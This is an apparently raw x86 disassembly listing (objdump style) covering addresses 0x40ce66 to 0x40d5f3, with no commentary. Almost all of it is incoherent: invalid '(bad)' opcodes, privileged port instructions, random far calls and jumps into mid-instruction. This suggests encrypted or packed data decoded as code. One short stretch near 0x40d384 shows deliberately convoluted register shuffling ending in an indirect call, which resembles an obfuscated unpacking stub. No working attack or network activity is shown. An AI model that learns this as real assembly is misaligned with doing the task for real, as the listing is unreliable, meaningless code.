  40ce66:	fs in  al,0xba
  40ce69:	mov    ebp,0x9b0bd3ea
  40ce6e:	loope  0x40ce19
  40ce70:	sub    DWORD PTR [edx*8+0x5c44ddcb],eax
  40ce77:	call   0xdd28:0xe45c04b9
  40ce7e:	in     eax,dx
  40ce7f:	adc    BYTE PTR [esi+0x30],dh
  40ce82:	das    
  40ce83:	pop    ss
  40ce84:	mov    edi,0xde8e6115
  40ce89:	sti    
  40ce8a:	cmp    ebp,DWORD PTR [ecx]
  40ce8c:	pop    ebp
  40ce8d:	mov    esp,DWORD PTR [edi+0x3ba95ca3]
  40ce93:	out    0x37,al
  40ce95:	fstp   DWORD PTR [edx+0x2b]
  40ce98:	ds xchg edx,eax
  40ce9a:	addr16 iret 
  40ce9c:	aad    0x2a
  40ce9e:	sub    al,0x3b
  40cea0:	or     al,0x67
  40cea2:	inc    esp
  40cea3:	retf   0x8c0
  40cea6:	shr    DWORD PTR [edx-0x6f2ee17d],0xf3
  40cead:	or     DWORD PTR [ecx+0x4e],0xffffffbb
  40ceb1:	call   0x7d8e:0xeaf8625d
  40ceb8:	retf   0xb8c0
  40cebb:	or     DWORD PTR [edx],ebx
  40cebd:	pop    esp
  40cebe:	arpl   WORD PTR [ebp+0x227d85a9],ax
  40cec4:	mov    WORD PTR [ebx-0x49ca7372],?
  40ceca:	aas    
  40cecb:	pop    ds
  40cecc:	xchg   esi,eax
  40cecd:	or     ch,BYTE PTR [ebx+0x1262cdc3]
  40ced3:	and    BYTE PTR [ebx+0x56711080],ch
  40ced9:	loopne 0x40ceec
  40cedb:	(bad)  
  40cedd:	lahf   
  40cede:	inc    ecx
  40cedf:	push   ds
  40cee0:	mov    ecx,0x261dd96a
  40cee5:	push   esp
  40cee6:	imul   ebp,DWORD PTR [eax+0x70],0xffffff80
  40ceea:	out    0x6c,al
  40ceec:	xor    ebx,esi
  40ceee:	xor    bh,BYTE PTR [ebp*2-0x2afd5b8]
  40cef5:	cmp    al,BYTE PTR [esp+eax*4]
  40cef8:	ret    0xa37
  40cefb:	outs   dx,DWORD PTR ds:[esi]
  40cefc:	popa   
  40cefd:	in     al,0xdc
  40ceff:	xor    BYTE PTR cs:0xd2e07c6e,ch
  40cf06:	xor    eax,0x67424f2
  40cf0b:	xchg   esp,eax
  40cf0c:	and    ecx,DWORD PTR [eax]
  40cf0e:	fs inc ecx
  40cf10:	adc    dl,bh
  40cf12:	cmp    dh,0xae
  40cf15:	sbb    bh,BYTE PTR [esi-0x3f]
  40cf18:	in     eax,0xbd
  40cf1a:	mov    ebp,0x93f66086
  40cf1f:	add    al,0xe0
  40cf21:	sbb    al,0x1e
  40cf23:	in     al,0xc9
  40cf25:	pop    eax
  40cf26:	sahf   
  40cf27:	jno    0x40ced2
  40cf29:	xor    eax,DWORD PTR [edx]
  40cf2b:	adc    BYTE PTR ds:0xe75ab0a4,ah
  40cf31:	mov    ds:0xcbe07ba7,al
  40cf36:	mov    DWORD PTR [ebx+ecx*1+0x64155d8],ebp
  40cf3d:	adc    edi,ebp
  40cf3f:	scas   eax,DWORD PTR es:[edi]
  40cf40:	sbb    al,0xb6
  40cf42:	sbb    bl,BYTE PTR [esi+0x712a86c]
  40cf48:	adc    al,0x7d
  40cf4a:	loope  0x40cf06
  40cf4c:	imul   edx,DWORD PTR [eax+0x5abfb1f7],0xf135105b
  40cf56:	mov    ah,0xad
  40cf58:	inc    edi
  40cf59:	pop    es
  40cf5a:	xchg   edi,eax
  40cf5b:	stc    
  40cf5c:	out    0x60,al
  40cf5e:	mov    ebp,0x32d6486f
  40cf63:	and    al,0x32
  40cf65:	inc    esp
  40cf66:	or     al,0x51
  40cf68:	retf   
  40cf69:	sub    DWORD PTR [edx],0x741859ba
  40cf6f:	fcomp  QWORD PTR [edi]
  40cf71:	mov    al,ds:0x233831ed
  40cf76:	mov    eax,0xe25e74c8
  40cf7b:	inc    ecx
  40cf7c:	rep stos BYTE PTR es:[edi],al
  40cf7e:	nop
  40cf7f:	aaa    
  40cf80:	int3   
  40cf81:	outs   dx,DWORD PTR ds:[esi]
  40cf82:	std    
  40cf83:	imul   ebp,DWORD PTR [esi],0xab232a79
  40cf89:	sub    bl,BYTE PTR [ebx-0x11]
  40cf8c:	icebp  
  40cf8d:	cmp    eax,0x96e22121
  40cf92:	sub    esp,esi
  40cf94:	bnd jl 0x40cf8d
  40cf97:	or     DWORD PTR [ecx+0x46],ecx
  40cf9a:	repnz in eax,0xa2
  40cf9d:	(bad)  
  40cf9e:	push   0xcd5f0582
  40cfa3:	mov    eax,0x705e3bca
  40cfa8:	push   es
  40cfa9:	add    BYTE PTR [eax-0x5b8d1bd1],ah
  40cfaf:	pop    ebp
  40cfb0:	pop    edx
  40cfb1:	jno    0x40cf67
  40cfb3:	push   edx
  40cfb4:	add    eax,0xb7ad2155
  40cfb9:	mov    eax,0x3cdca274
  40cfbe:	f2xm1  
  40cfc0:	(bad)  
  40cfc1:	retf   0xd833
  40cfc4:	hlt    
  40cfc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc6:	add    eax,DWORD PTR [edi+eiz*4-0x65b3a487]
  40cfcd:	mov    ah,0xe3
  40cfcf:	inc    esi
  40cfd0:	dec    edx
  40cfd1:	inc    ebx
  40cfd2:	outs   dx,DWORD PTR ds:[esi]
  40cfd3:	fwait
  40cfd4:	imul   BYTE PTR [ecx-0xa]
  40cfd7:	loop   0x40cfb1
  40cfd9:	aas    
  40cfda:	fwait
  40cfdb:	imul   edx,DWORD PTR [ebx-0x17],0x881c2adf
  40cfe2:	pop    ecx
  40cfe3:	aam    0x52
  40cfe5:	jae    0x40cf7e
  40cfe7:	push   edi
  40cfe8:	mov    bl,0xde
  40cfea:	stc    
  40cfeb:	jno    0x40d00c
  40cfed:	xor    esp,edx
  40cfef:	fistp  DWORD PTR [esi-0x251585b4]
  40cff5:	cmp    BYTE PTR [ebx+ebp*2+0xc],bh
  40cff9:	sbb    eax,DWORD PTR es:[ecx+0x1ac63266]
  40d000:	xchg   esi,eax
  40d001:	push   ecx
  40d002:	inc    esi
  40d003:	mov    ch,0x7a
  40d005:	and    DWORD PTR [edi+0x42ce8e77],edi
  40d00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d00c:	push   ecx
  40d00d:	pusha  
  40d00e:	xor    ah,bh
  40d010:	lahf   
  40d011:	(bad)  
  40d012:	adc    BYTE PTR ds:0xdbf60eb6,cl
  40d018:	dec    eax
  40d019:	add    eax,0xcffd211
  40d01e:	pop    ebp
  40d01f:	iret   
  40d020:	pop    esp
  40d021:	and    bh,BYTE PTR ds:0xd3b11144
  40d027:	dec    edi
  40d028:	leave  
  40d029:	inc    esi
  40d02a:	mov    edi,0x4713850b
  40d02f:	xchg   esp,eax
  40d030:	dec    ebp
  40d031:	or     al,0xce
  40d033:	or     ecx,DWORD PTR [ecx]
  40d035:	call   0x2d848176
  40d03a:	aas    
  40d03b:	pushf  
  40d03c:	sub    al,0xd9
  40d03e:	jp     0x40d03a
  40d040:	sbb    al,0x7b
  40d042:	cli    
  40d043:	fsubr  QWORD PTR [edi-0x774d5f17]
  40d049:	add    eax,edx
  40d04b:	pop    ebp
  40d04c:	aaa    
  40d04d:	int    0x7e
  40d04f:	fsubrp st(7),st
  40d051:	mov    WORD PTR [esi+0x6a],?
  40d054:	test   BYTE PTR [ecx-0x1908668e],al
  40d05a:	test   ecx,0xc820fa8b
  40d060:	cli    
  40d061:	cli    
  40d062:	mov    bl,0xbb
  40d064:	sub    al,0x63
  40d066:	cdq    
  40d067:	enter  0xbaf1,0x1c
  40d06b:	pop    esp
  40d06c:	in     al,dx
  40d06d:	sbb    BYTE PTR [edi],bl
  40d06f:	adc    dh,bh
  40d071:	mov    bl,0xa2
  40d073:	daa    
  40d074:	adc    BYTE PTR [edx+edx*4+0x1f],dl
  40d078:	jmp    0xed85:0xf53f6100
  40d07f:	adc    eax,0x42f1e40
  40d084:	sbb    al,0x92
  40d086:	jb     0x40d061
  40d088:	push   cs
  40d089:	adc    BYTE PTR [ebp+0x25],al
  40d08c:	mov    dl,0x59
  40d08e:	inc    ebx
  40d08f:	jne    0x40d07d
  40d091:	or     al,0xdf
  40d093:	sub    eax,0x31beeca7
  40d098:	inc    ebx
  40d099:	repz push edi
  40d09b:	adc    edi,DWORD PTR [edi]
  40d09d:	and    eax,0x9ca0f083
  40d0a2:	das    
  40d0a3:	or     eax,0xe28e5348
  40d0a8:	dec    ebx
  40d0a9:	cmp    eax,0x7d69a119
  40d0ae:	push   cs
  40d0af:	aam    0xb8
  40d0b1:	mov    bh,0xe8
  40d0b3:	mov    esi,0xcf4f73d
  40d0b8:	retf   
  40d0b9:	test   dl,ch
  40d0bb:	sar    BYTE PTR [ebp-0x72768979],cl
  40d0c1:	jmp    0x622b804b
  40d0c6:	adc    eax,0xef7ca757
  40d0cb:	mov    dl,0xbc
  40d0cd:	add    dh,ch
  40d0cf:	icebp  
  40d0d0:	bound  eax,QWORD PTR [edx+0x31]
  40d0d3:	fcom   st(6)
  40d0d5:	leave  
  40d0d6:	push   0xffffffbf
  40d0d8:	sub    ebp,0xb3e745b5
  40d0de:	je     0x40d0a9
  40d0e0:	and    esp,edx
  40d0e2:	je     0x40d0b6
  40d0e4:	loop   0x40d08d
  40d0e6:	inc    ebp
  40d0e7:	add    al,0xe
  40d0e9:	lock xor eax,0xd01ec0b1
  40d0ef:	outs   dx,DWORD PTR ds:[esi]
  40d0f0:	sbb    BYTE PTR [edx],dh
  40d0f2:	cmp    BYTE PTR [edx+0x11fc1a51],dh
  40d0f8:	mov    ebx,0xc857b237
  40d0fd:	leave  
  40d0fe:	jnp    0x40d13f
  40d100:	jle    0x40d176
  40d102:	(bad)  [edi+0x51]
  40d105:	clc    
  40d106:	mov    esi,0x91e00294
  40d10b:	jbe    0x40d16d
  40d10d:	cs dec edi
  40d10f:	mov    cl,0xeb
  40d111:	jg     0x40d0af
  40d113:	mov    dl,0xcb
  40d115:	push   edx
  40d116:	out    0x92,al
  40d118:	in     eax,0xb0
  40d11a:	xor    BYTE PTR [edx],ch
  40d11c:	push   0x6e
  40d11e:	arpl   si,ax
  40d120:	inc    esi
  40d121:	out    0xf8,al
  40d123:	cwde   
  40d124:	inc    BYTE PTR [eax+0x4d]
  40d127:	into   
  40d128:	leave  
  40d129:	cld    
  40d12a:	int3   
  40d12b:	stos   DWORD PTR es:[edi],eax
  40d12c:	ja     0x40d184
  40d12e:	xchg   ebx,eax
  40d12f:	push   cs
  40d130:	fdiv   QWORD PTR [edx+0x78]
  40d133:	pop    ss
  40d134:	sub    bh,BYTE PTR [esi+esi*4+0x2a62c6c9]
  40d13b:	out    0x51,al
  40d13d:	jge    0x40d0fd
  40d13f:	and    esp,eax
  40d141:	pop    ebp
  40d142:	aas    
  40d143:	jl     0x40d1a2
  40d145:	add    al,0xf9
  40d147:	pop    edx
  40d148:	mov    bh,0x25
  40d14a:	rol    DWORD PTR [esi],cl
  40d14c:	xlat   BYTE PTR ds:[ebx]
  40d14d:	push   cs
  40d14e:	push   esi
  40d14f:	mov    bl,0xe3
  40d151:	dec    edx
  40d152:	(bad)  
  40d153:	push   cs
  40d154:	fmul   QWORD PTR [esi-0x7213a23]
  40d15a:	fwait
  40d15b:	cwde   
  40d15c:	(bad)  
  40d15d:	lods   al,BYTE PTR ds:[esi]
  40d15e:	sub    BYTE PTR [esi+ecx*1-0x2a862bee],cl
  40d165:	and    al,0x75
  40d167:	sbb    esp,DWORD PTR [ecx]
  40d169:	int3   
  40d16a:	add    BYTE PTR [esi-0x35],dh
  40d16d:	adc    eax,0x77980d05
  40d172:	mov    esi,0x62703912
  40d177:	shl    ch,cl
  40d179:	ror    DWORD PTR [ecx],1
  40d17b:	and    al,0xfb
  40d17d:	unpckhps xmm0,XMMWORD PTR [edx+0x3c]
  40d181:	or     edx,DWORD PTR [ecx+esi*2-0x6dd5efb9]
  40d188:	push   edi
  40d189:	jno    0x40d123
  40d18b:	out    0xb4,al
  40d18d:	dec    edx
  40d18e:	xor    al,BYTE PTR ds:0xb2a7d716
  40d194:	jp     0x40d1d5
  40d196:	mov    eax,0x58e3ec7c
  40d19b:	(bad)  
  40d19c:	mov    ebp,0x88890350
  40d1a1:	pop    edi
  40d1a2:	in     al,0xe1
  40d1a4:	jmp    DWORD PTR [esi+0x6]
  40d1a7:	ins    BYTE PTR es:[edi],dx
  40d1a8:	push   ds
  40d1a9:	loopne 0x40d14c
  40d1ab:	adc    BYTE PTR [ecx-0x6a1f3015],bl
  40d1b1:	cmp    dl,BYTE PTR [ebx+edx*8+0x1a]
  40d1b5:	or     eax,0x3d6d4869
  40d1ba:	mov    edx,0x5c671fa9
  40d1bf:	and    DWORD PTR [ecx-0x15],ecx
  40d1c2:	ror    DWORD PTR [ebp-0x10],cl
  40d1c5:	jmp    0x40d183
  40d1c7:	out    0x7d,al
  40d1c9:	or     al,BYTE PTR [esi+0x40]
  40d1cc:	gs mov bl,ch
  40d1cf:	(bad)  
  40d1d1:	(bad)  
  40d1d2:	jno    0x40d1dd
  40d1d4:	outs   dx,DWORD PTR ds:[esi]
  40d1d5:	test   dl,dl
  40d1d7:	mov    dl,BYTE PTR [edx-0x33959388]
  40d1dd:	mov    esp,0x25d0edc2
  40d1e2:	pop    ebx
  40d1e3:	sbb    BYTE PTR [ebx],dl
  40d1e5:	xor    ah,BYTE PTR [ebx+0x7808bc10]
  40d1eb:	mov    al,ds:0xe8b70a69
  40d1f0:	retf   0x5625
  40d1f3:	mov    cl,0x40
  40d1f5:	cmp    eax,0x1ae427f8
  40d1fa:	bound  esi,QWORD PTR [ecx+0x77]
  40d1fd:	in     al,dx
  40d1fe:	out    dx,al
  40d1ff:	fldln2 
  40d201:	pop    esp
  40d202:	pop    esi
  40d203:	push   0x8c288124
  40d208:	push   0x7b244bd9
  40d20d:	sub    al,ch
  40d20f:	div    dh
  40d211:	hlt    
  40d212:	xchg   esi,eax
  40d213:	xchg   ebp,eax
  40d214:	ret    
  40d215:	adc    al,BYTE PTR [eax+0x28]
  40d218:	pushf  
  40d219:	shl    edx,1
  40d21b:	ins    BYTE PTR es:[edi],dx
  40d21c:	dec    ebp
  40d21d:	in     al,0x9e
  40d21f:	arpl   WORD PTR [edi],dx
  40d221:	inc    esi
  40d222:	xchg   ecx,eax
  40d223:	or     BYTE PTR [esi-0x76cdef15],bl
  40d229:	scas   eax,DWORD PTR es:[edi]
  40d22a:	leave  
  40d22b:	sub    ecx,DWORD PTR [bp+si-0x6e46]
  40d230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d231:	mov    edx,0x9dfc133f
  40d236:	jp     0x40d267
  40d238:	sar    ah,0xa7
  40d23b:	push   esi
  40d23c:	jo     0x40d1fa
  40d23e:	add    edi,DWORD PTR [edx-0x8a651e]
  40d244:	ror    DWORD PTR [ebx+0x4],0x5a
  40d248:	inc    ecx
  40d249:	sub    BYTE PTR [edi+ebx*1-0xe],ah
  40d24d:	mov    WORD PTR [edi-0x46],?
  40d250:	mov    bh,al
  40d252:	dec    edx
  40d253:	xlat   BYTE PTR ds:[ebx]
  40d254:	arpl   WORD PTR es:[edi-0x22],di
  40d258:	(bad)  
  40d25a:	or     bl,0x99
  40d25d:	and    DWORD PTR [eax+eax*4-0x49acc45d],edx
  40d264:	adc    esp,DWORD PTR [esi]
  40d266:	stc    
  40d267:	mov    ss,WORD PTR [esi+0x47]
  40d26a:	sub    eax,0xa9db185a
  40d26f:	sub    bh,cl
  40d271:	daa    
  40d272:	pop    ecx
  40d273:	xchg   edx,eax
  40d274:	xchg   esp,eax
  40d275:	sub    eax,0x646fe2d8
  40d27a:	push   0x62
  40d27c:	icebp  
  40d27d:	adc    eax,0x1494219b
  40d282:	iret   
  40d283:	not    ah
  40d285:	pop    es
  40d286:	fsub   st(2),st
  40d288:	ja     0x40d224
  40d28a:	loope  0x40d304
  40d28c:	mov    esp,DWORD PTR [edx]
  40d28e:	push   0x54
  40d290:	cld    
  40d291:	into   
  40d292:	mov    ah,BYTE PTR [ecx+ecx*2+0x65]
  40d296:	mov    al,0x75
  40d298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d299:	mov    ah,dh
  40d29b:	xchg   edi,eax
  40d29c:	push   esp
  40d29d:	push   0x3f992591
  40d2a2:	and    BYTE PTR [edi+0x4a],dl
  40d2a5:	jge    0x40d24a
  40d2a7:	test   DWORD PTR [eax-0x193fedd],ebp
  40d2ad:	dec    ecx
  40d2ae:	jns    0x40d24e
  40d2b0:	gs mov esi,edi
  40d2b3:	and    BYTE PTR fs:[ebx+0x4d1c475c],ch
  40d2ba:	lods   eax,DWORD PTR ds:[esi]
  40d2bb:	add    al,0x5c
  40d2bd:	sub    eax,0x2530780c
  40d2c2:	das    
  40d2c3:	sub    BYTE PTR ds:0x90323c78,dl
  40d2c9:	cmp    edx,DWORD PTR [ecx+0x23f735d0]
  40d2cf:	jmp    0x9702bf15
  40d2d4:	rcr    BYTE PTR [ecx],1
  40d2d6:	leave  
  40d2d7:	pop    esi
  40d2d8:	mov    dl,ch
  40d2da:	aam    0x65
  40d2dc:	pop    esp
  40d2dd:	in     eax,dx
  40d2de:	sub    eax,0xa9954f95
  40d2e3:	cmp    ebx,eax
  40d2e5:	jg     0x40d269
  40d2e7:	les    eax,FWORD PTR [ecx-0x7]
  40d2ea:	mov    eax,ds:0x7013a5da
  40d2ef:	xor    DWORD PTR [ebp+0x49],edx
  40d2f2:	xchg   BYTE PTR [esi],dh
  40d2f4:	push   esp
  40d2f5:	sub    BYTE PTR [ebx+ecx*2+0x44],0x48
  40d2fa:	repnz int3 
  40d2fc:	mov    esp,DWORD PTR [ecx+0xb]
  40d2ff:	js     0x40d2e2
  40d301:	sbb    esp,esi
  40d303:	arpl   WORD PTR [eax+0x64069fb4],dx
  40d309:	push   eax
  40d30a:	mov    ecx,0x776c4eb8
  40d30f:	retf   
  40d310:	xchg   ecx,eax
  40d311:	das    
  40d312:	push   ebx
  40d313:	mov    edi,0xeeba99e7
  40d318:	or     BYTE PTR [ebx+0x1114cfa0],0x40
  40d31f:	dec    esp
  40d320:	cmc    
  40d321:	repz xor BYTE PTR ds:0x2e180f1c,ah
  40d328:	out    dx,al
  40d329:	push   edi
  40d32a:	shl    BYTE PTR ds:[ebx+0x1f],0xf7
  40d32f:	data16 imul BYTE PTR ds:0x474016f8
  40d336:	call   0x397140a3
  40d33b:	dec    ecx
  40d33c:	sti    
  40d33d:	ins    DWORD PTR es:[edi],dx
  40d33e:	adc    BYTE PTR [esi+0x18],bh
  40d341:	sti    
  40d342:	mov    BYTE PTR [ebx],bl
  40d344:	or     esi,esp
  40d346:	push   edi
  40d347:	stos   DWORD PTR es:[edi],eax
  40d348:	xchg   edx,eax
  40d349:	dec    eax
  40d34a:	mov    ecx,DWORD PTR [eax]
  40d34c:	or     DWORD PTR [ecx],esp
  40d34e:	test   dl,al
  40d350:	push   ss
  40d351:	stc    
  40d352:	push   esp
  40d353:	xlat   BYTE PTR ds:[ebx]
  40d354:	imul   ebp,DWORD PTR [ecx],0x6e
  40d357:	xchg   ebx,eax
  40d358:	cmp    DWORD PTR [edi],0x1f
  40d35b:	xor    eax,0x4381d976
  40d360:	pop    ss
  40d361:	stos   DWORD PTR es:[edi],eax
  40d362:	dec    ecx
  40d363:	aam    0xf6
  40d365:	scas   al,BYTE PTR es:[edi]
  40d366:	ret    
  40d367:	call   0xf2b17164
  40d36c:	push   ebp
  40d36d:	jo     0x40d347
  40d36f:	xor    DWORD PTR [edx+ecx*8-0x6a58961b],esp
  40d376:	in     al,0x72
  40d378:	aam    0x51
  40d37a:	sti    
  40d37b:	cmc    
  40d37c:	add    DWORD PTR [esi-0x7f],0xffffffc3
  40d380:	add    dl,BYTE PTR [eax]
  40d382:	add    BYTE PTR [eax],al
  40d384:	lea    eax,[ebp-0x18]
  40d387:	add    edx,eax
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	mov    ah,0x53
  40d3d2:	pop    edx
  40d3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3d4:	mov    dl,0xd3
  40d3d6:	add    DWORD PTR [ebx-0x7c7ca1f4],0xfffffffd
  40d3dd:	ins    DWORD PTR es:[edi],dx
  40d3de:	in     al,dx
  40d3df:	inc    edx
  40d3e0:	jecxz  0x40d3d7
  40d3e2:	sbb    al,0xfe
  40d3e4:	jl     0x40d409
  40d3e6:	add    al,0x35
  40d3e8:	call   0x6b03:0x6f74ccc
  40d3ef:	data16 fdiv QWORD PTR [ebx+0xda503e7]
  40d3f6:	dec    esp
  40d3f7:	sub    dl,BYTE PTR [esi-0x64]
  40d3fa:	in     al,0x3d
  40d3fc:	jl     0x40d432
  40d3fe:	std    
  40d3ff:	push   ebp
  40d400:	push   ebp
  40d401:	jecxz  0x40d3a6
  40d403:	loopne 0x40d3de
  40d405:	push   0xe62a9412
  40d40a:	stos   DWORD PTR es:[edi],eax
  40d40b:	in     eax,dx
  40d40c:	sbb    DWORD PTR [ecx],esi
  40d40e:	pusha  
  40d40f:	dec    esi
  40d410:	xchg   ebx,eax
  40d411:	mov    esi,0xbe43c2f1
  40d416:	and    al,0xf7
  40d418:	ins    BYTE PTR es:[edi],dx
  40d419:	cld    
  40d41a:	push   ecx
  40d41b:	sub    al,0x3
  40d41d:	pushf  
  40d41e:	lahf   
  40d41f:	and    BYTE PTR [esi],bl
  40d421:	mov    esi,0xd19d9659
  40d426:	adc    al,0x62
  40d428:	pop    edx
  40d429:	xchg   edi,eax
  40d42a:	push   ebx
  40d42b:	dec    ebp
  40d42c:	sub    esi,DWORD PTR [ecx+edi*8-0x53]
  40d430:	sub    al,BYTE PTR [ebx+0x19]
  40d433:	es in  eax,0xed
  40d436:	inc    edx
  40d437:	cli    
  40d438:	xor    al,0x1c
  40d43a:	int3   
  40d43b:	cwde   
  40d43c:	push   edi
  40d43d:	sbb    eax,0x3a3dfa1b
  40d442:	xchg   ecx,eax
  40d443:	jp     0x40d406
  40d445:	mov    ds:0x47a8cbd7,eax
  40d44a:	lea    eax,[esi]
  40d44c:	mov    edi,0xf125fa6b
  40d451:	xor    ah,BYTE PTR [edx-0x42b51935]
  40d457:	sti    
  40d458:	lock shl DWORD PTR [edi+0x5a2b6469],cl
  40d45f:	xchg   edx,eax
  40d460:	xchg   esi,eax
  40d461:	inc    esi
  40d462:	xchg   esp,eax
  40d463:	sub    eax,0x5a0ffa90
  40d468:	lea    eax,[ebx+esi*4+0x2f529777]
  40d46f:	sahf   
  40d470:	popf   
  40d471:	call   0x2222:0xadf6e4d1
  40d478:	cmp    eax,0x9276f132
  40d47d:	add    edx,edi
  40d47f:	sbb    DWORD PTR [eax-0x46efd7cd],0x29230127
  40d489:	push   0xfffffffd
  40d48b:	push   ds
  40d48c:	mov    dh,0xd4
  40d48e:	in     al,0x83
  40d490:	shl    DWORD PTR [edi],0x7f
  40d493:	sbb    esp,ecx
  40d495:	xor    BYTE PTR [ecx-0x17],ah
  40d498:	in     eax,0x2c
  40d49a:	fwait
  40d49b:	data16 cs int 0x8c
  40d49f:	add    al,0x44
  40d4a1:	(bad)  
  40d4a3:	pop    esp
  40d4a4:	or     cl,0x86
  40d4a7:	xor    eax,0x53f67ea1
  40d4ac:	das    
  40d4ad:	lods   eax,DWORD PTR ds:[esi]
  40d4ae:	jge    0x40d4d6
  40d4b0:	cli    
  40d4b1:	mov    esi,0xd83169ed
  40d4b6:	je     0x9048267
  40d4bc:	push   cs
  40d4bd:	inc    esp
  40d4be:	mov    eax,ds:0x14b29069
  40d4c3:	xchg   esi,eax
  40d4c4:	mov    dh,0xf9
  40d4c6:	jp     0x40d51d
  40d4c8:	mov    esp,0xb2141d3d
  40d4cd:	fadd   QWORD PTR [eax-0x19]
  40d4d0:	inc    edi
  40d4d1:	or     BYTE PTR [ebx-0x6d8346df],dl
  40d4d7:	jae    0x40d49d
  40d4d9:	lahf   
  40d4da:	retf   
  40d4db:	cmp    al,0x15
  40d4dd:	inc    edi
  40d4de:	dec    esi
  40d4df:	xchg   ecx,eax
  40d4e0:	mov    eax,ds:0x80e4c156
  40d4e5:	sbb    al,0x90
  40d4e7:	pop    ecx
  40d4e8:	mov    WORD PTR [bp+di],cs
  40d4eb:	mov    dl,0x5e
  40d4ed:	shl    esi,0x8f
  40d4f0:	pop    ecx
  40d4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4f2:	ins    DWORD PTR es:[edi],dx
  40d4f3:	and    BYTE PTR [edx+0x79d163a6],bl
  40d4f9:	xchg   ebx,eax
  40d4fa:	test   esp,0x8bf9e1c6
  40d500:	test   al,0xc0
  40d502:	jmp    0xfa58a7b0
  40d507:	cs js  0x40d538
  40d50a:	pop    esi
  40d50b:	and    bh,0x41
  40d50e:	in     al,dx
  40d50f:	and    BYTE PTR [edi],al
  40d511:	rep ins BYTE PTR es:[edi],dx
  40d513:	cdq    
  40d514:	and    BYTE PTR [ecx-0x78],bl
  40d517:	cli    
  40d518:	inc    eax
  40d519:	lea    ebx,[eax+0x1a012dac]
  40d51f:	mov    ecx,DWORD PTR [ebx-0x2b4269eb]
  40d525:	retf   
  40d526:	pusha  
  40d527:	cmc    
  40d528:	dec    ebp
  40d529:	retf   0xa10e
  40d52c:	dec    ebp
  40d52d:	push   es
  40d52e:	push   edx
  40d52f:	stos   BYTE PTR es:[edi],al
  40d530:	and    eax,0xb8749f54
  40d535:	stos   DWORD PTR es:[edi],eax
  40d536:	mov    esp,0xbf1822b3
  40d53b:	subps  xmm1,XMMWORD PTR [ebx]
  40d53e:	sar    DWORD PTR [edi-0x2b],cl
  40d541:	sub    ch,BYTE PTR [edx]
  40d543:	pop    esp
  40d544:	and    cl,BYTE PTR [eax+ebx*2]
  40d547:	add    edx,esp
  40d549:	jne    0x40d4f4
  40d54b:	sbb    eax,0xe5488829
  40d550:	scas   al,BYTE PTR es:[edi]
  40d551:	dec    edx
  40d552:	add    dh,dl
  40d554:	push   0x652edbef
  40d559:	(bad)  [edx]
  40d55b:	imul   ebp,DWORD PTR [ebx],0x15f2e8d1
  40d561:	imul   esp,DWORD PTR [ebx+0x3c1b71f2],0xffffff90
  40d568:	icebp  
  40d569:	and    cl,BYTE PTR [eax]
  40d56b:	call   0x721e:0xe68528e6
  40d572:	fnstcw WORD PTR [ebp-0x65]
  40d575:	pop    ecx
  40d576:	cmc    
  40d577:	mov    eax,0x18d5001f
  40d57c:	test   BYTE PTR [ebx+edi*1-0x4e],0xb4
  40d581:	adc    BYTE PTR [ebx],bh
  40d583:	inc    esp
  40d584:	sub    eax,0x42f2c957
  40d589:	lahf   
  40d58a:	sub    dl,al
  40d58c:	aam    0x30
  40d58e:	pushf  
  40d58f:	jae    0x40d555
  40d591:	add    BYTE PTR [edi-0x13],dl
  40d594:	sbb    ecx,ebx
  40d596:	pop    eax
  40d597:	mov    WORD PTR [ebp+0x42],cs
  40d59a:	fidiv  WORD PTR [edx]
  40d59c:	push   0xffffffe1
  40d59e:	sbb    al,0xeb
  40d5a0:	lock push si
  40d5a3:	cld    
  40d5a4:	ds aam 0x9c
  40d5a7:	(bad)  
  40d5a8:	retf   0x1eac
  40d5ab:	dec    esi
  40d5ac:	xor    al,0x11
  40d5ae:	cli    
  40d5af:	ja     0x40d586
  40d5b1:	or     al,0x17
  40d5b3:	mov    edi,DWORD PTR [edi+0xc]
  40d5b6:	cmp    al,bh
  40d5b8:	jecxz  0x40d5f9
  40d5ba:	scas   eax,DWORD PTR es:[edi]
  40d5bb:	std    
  40d5bc:	mov    eax,ds:0x2bbaa15
  40d5c1:	stos   DWORD PTR es:[edi],eax
  40d5c2:	xchg   edx,eax
  40d5c3:	fld    TBYTE PTR ds:0x34709e5c
  40d5c9:	jecxz  0x40d5d9
  40d5cb:	or     al,0xd7
  40d5cd:	xor    dl,BYTE PTR ds:[esp+edi*4+0x6e597373]
  40d5d5:	push   cs
  40d5d6:	or     ah,bl
  40d5d8:	inc    eax
  40d5d9:	xchg   ecx,eax
  40d5da:	mov    edx,0xd5535c6b
  40d5df:	push   ebp
  40d5e0:	ret    
  40d5e1:	xchg   esi,eax
  40d5e2:	jno    0x40d60f
  40d5e4:	into   
  40d5e5:	repz shl ebx,1
  40d5e8:	les    esi,FWORD PTR [edx-0x58]
  40d5eb:	adc    cl,BYTE PTR [ebx+edx*8]
  40d5ee:	xor    eax,0x3bb480f2
  40d5f3:	ds ja  0x40d57c
